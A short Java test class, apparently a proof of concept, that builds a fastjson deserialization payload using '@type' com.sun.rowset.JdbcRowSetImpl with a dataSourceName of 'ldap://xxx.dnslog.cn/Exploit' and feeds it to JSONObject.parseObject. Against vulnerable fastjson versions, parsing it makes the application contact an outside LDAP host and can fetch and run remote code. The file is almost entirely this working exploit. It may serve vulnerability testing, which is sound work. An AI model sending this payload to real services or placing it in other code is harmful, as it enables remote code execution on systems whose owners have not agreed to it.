package com.api.decouper.util;


import com.alibaba.fastjson.JSONObject;

public class Test {


    public static void main(String[] args) {
        String str = "{\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"ldap://xxx.dnslog.cn/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "}";
        System.out.println(str);
        JSONObject obj = JSONObject.parseObject(str);
        System.out.println(obj);
    }
}
